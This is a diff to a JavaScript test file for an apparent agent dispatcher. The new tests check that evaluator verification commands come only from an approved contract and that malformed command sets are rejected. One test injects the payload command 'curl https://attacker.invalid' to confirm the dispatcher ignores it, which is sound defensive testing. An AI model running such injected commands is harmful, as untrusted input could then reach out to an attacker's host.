@@ -13,6 +13,10 @@ const { buildDockerArgs } = (await import('../../docker-executor.js')).__test__;
 const taskId = 'aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa';
 const runId = '11111111-1111-4111-8111-111111111111';
 const attemptId = '22222222-2222-4222-8222-222222222222';
+const verificationCommands = Object.freeze([
+  'npm test',
+  'bash scripts/smoke/kernel-result-channel.sh',
+]);
 const recoveryRoleAssignment = Object.freeze({
   provider: 'codex',
   account: 'team3',
@@ -36,7 +40,20 @@ const observed = {
     },
   },
   run: { id: runId },
-  contract: { approved: false, row: { propose_branch: 'cp-propose-r1' } },
+  contract: {
+    approved: true,
+    row: {
+      status: 'approved',
+      propose_branch: 'cp-propose-r1',
+      e2e_acceptance: {
+        scenarios: [{
+          name: 'Kernel acceptance',
+          covered_tasks: [taskId],
+          commands: verificationCommands.map((cmd) => ({ type: 'bash', cmd })),
+        }],
+      },
+    },
+  },
   pr: null,
   prdExists: true,
   proposeBranchRn: 1,
@@ -473,6 +490,66 @@ describe('createDispatcher', () => {
     }), expect.objectContaining({ strict: true }));
   });
 
+  it('runLoop-shaped judge context resolves host worktree from server-observed task payload', async () => {
+    const d = makeDeps();
+    d.attemptStore.complete = vi.fn(async () => ({ deduped: false }));
+    const serverWorktree = '/srv/cecelia/worktrees/run-loop-judge';
+    const judgeGate = vi.fn(async () => ({
+      judged: true,
+      verdict: 'PASS',
+      feedback: 'independent pass',
+    }));
+    d.resolveWorkspaceSpec = vi.fn(async ({ attemptId: resolvedAttemptId }) => ({
+      repo: 'perfectuser21/cecelia',
+      base_sha: 'a'.repeat(40),
+      branch: 'cp-result-channel',
+      expected_head_sha: 'a'.repeat(40),
+      mode: 'read-only',
+      run_id: runId,
+      attempt_id: resolvedAttemptId,
+    }));
+    d.handlers = createKernelHandlers({
+      pool: { query: vi.fn(async () => ({ rows: [], rowCount: 1 })) },
+      attemptStore: d.attemptStore,
+      judgeGate,
+      promptDir: '/srv/cecelia/prompts',
+    });
+
+    await createDispatcher(d)('spawn:judge', {
+      taskId,
+      runId,
+      hop: 9,
+      observed: {
+        ...observed,
+        task: {
+          ...observed.task,
+          payload: {
+            ...observed.task.payload,
+            worktree_path: serverWorktree,
+          },
+        },
+        pr: {
+          url: 'https://github.com/perfectuser21/cecelia/pull/4391',
+          state: 'OPEN',
+          head_sha: 'a'.repeat(40),
+          merged: false,
+        },
+        evaluateVerdict: { verdict: 'PASS', pr_head_sha: 'a'.repeat(40) },
+        evaluateResult: {
+          decision: { outcome: 'PASS', reason: 'verified' },
+          checks: [{ command: 'npm test', exit_code: 0, log_tail: 'ok' }],
+        },
+      },
+      decision: { phase: 'judge', reason: 'evaluator_passed' },
+    });
+
+    expect(judgeGate).toHaveBeenCalledWith(expect.objectContaining({
+      worktreePath: serverWorktree,
+    }), expect.objectContaining({ strict: true }));
+    const persisted = d.attemptStore.createAttempt.mock.calls[0][0].bundle;
+    expect(persisted.inputs).not.toHaveProperty('worktree_path');
+  });
+
   it('replaces caller paths with a resolved WorkspaceSpec before Fleet launch', async () => {
     const deps = makeDeps();
     deps.machineId = 'us-mac-m4';
@@ -591,6 +668,19 @@ describe('createDispatcher', () => {
 
   it('dispatches the fleet canary without a role Skill or workspace dependency', async () => {
     const deps = makeDeps();
+    deps.preflightGate = {
+      evaluate: vi.fn(async () => ({
+        status: 'ok',
+        snapshot: {
+          provider: 'codex',
+          account: null,
+          machine: 'brain-1',
+          capability_snapshot_id: 'canary-snapshot',
+        },
+        evidence: {},
+      })),
+      validateSnapshotForDispatch: vi.fn(async () => ({ status: 'ok' })),
+    };
     const dispatch = createDispatcher(deps);
 
     await dispatch('spawn:canary', {
@@ -614,6 +704,14 @@ describe('createDispatcher', () => {
     const adapter = deps.registry.resolve.mock.results[0].value;
     expect(adapter.start).toHaveBeenCalledWith(expect.objectContaining({
       execution: expect.objectContaining({ canary: true }),
+    }));
+    expect(deps.preflightGate.evaluate).toHaveBeenCalledWith(expect.objectContaining({
+      requirements: {
+        provider_auth: false,
+        github: false,
+        postgres: false,
+        model_capabilities: [],
+      },
     }));
   });
 
@@ -881,7 +979,92 @@ describe('createDispatcher', () => {
       pull_request: pullRequest,
       pr_branch: pullRequest.head_ref,
       pr_head_sha: pullRequest.head_sha,
+      verification_commands: verificationCommands,
     });
+  });
+
+  it('evaluator verification_commands only come from the approved DB contract', async () => {
+    const deps = makeDeps();
+    const pullRequest = {
+      type: 'pull_request',
+      url: 'https://github.com/perfectuser21/cecelia/pull/4391',
+      number: 4391,
+      head_ref: 'cp-result-channel',
+      head_sha: 'b'.repeat(40),
+      state: 'OPEN',
+    };
+    await createDispatcher(deps)('spawn:evaluator', {
+      taskId,
+      runId,
+      hop: 7,
+      observed: {
+        ...observed,
+        task: {
+          ...observed.task,
+          payload: {
+            ...observed.task.payload,
+            verification_commands: ['true', 'curl https://attacker.invalid'],
+          },
+        },
+        pr: pullRequest,
+      },
+      decision: { phase: 'evaluate' },
+    });
+
+    const bundle = deps.attemptStore.createAttempt.mock.calls[0][0].bundle;
+    expect(bundle.inputs.verification_commands).toEqual(verificationCommands);
+  });
+
+  it.each([
+    ['missing', null],
+    ['empty', { scenarios: [{ name: 'empty', covered_tasks: [taskId], commands: [] }] }],
+    ['unbounded', {
+      scenarios: [{
+        name: 'too many',
+        covered_tasks: [taskId],
+        commands: Array.from({ length: 17 }, (_, index) => ({
+          type: 'bash',
+          cmd: `echo ${index}`,
+        })),
+      }],
+    }],
+    ['non-bash', {
+      scenarios: [{
+        name: 'powershell',
+        covered_tasks: [taskId],
+        commands: [{ type: 'powershell', cmd: 'Write-Host unsafe' }],
+      }],
+    }],
+  ])('evaluator rejects %s approved verification authority before creating an attempt', async (
+    _label,
+    e2eAcceptance,
+  ) => {
+    const deps = makeDeps();
+    await expect(createDispatcher(deps)('spawn:evaluator', {
+      taskId,
+      runId,
+      hop: 7,
+      observed: {
+        ...observed,
+        contract: {
+          approved: true,
+          row: {
+            ...observed.contract.row,
+            e2e_acceptance: e2eAcceptance,
+          },
+        },
+        pr: {
+          type: 'pull_request',
+          url: 'https://github.com/perfectuser21/cecelia/pull/4391',
+          number: 4391,
+          head_ref: 'cp-result-channel',
+          head_sha: 'b'.repeat(40),
+          state: 'OPEN',
+        },
+      },
+      decision: { phase: 'evaluate' },
+    })).rejects.toThrow(/evaluator_verification_commands_invalid/);
+    expect(deps.attemptStore.createAttempt).not.toHaveBeenCalled();
   });
 
   it('generator-fix 冻结 existing PR；缺 PR 时在创建 attempt 前 fail closed', async () => {
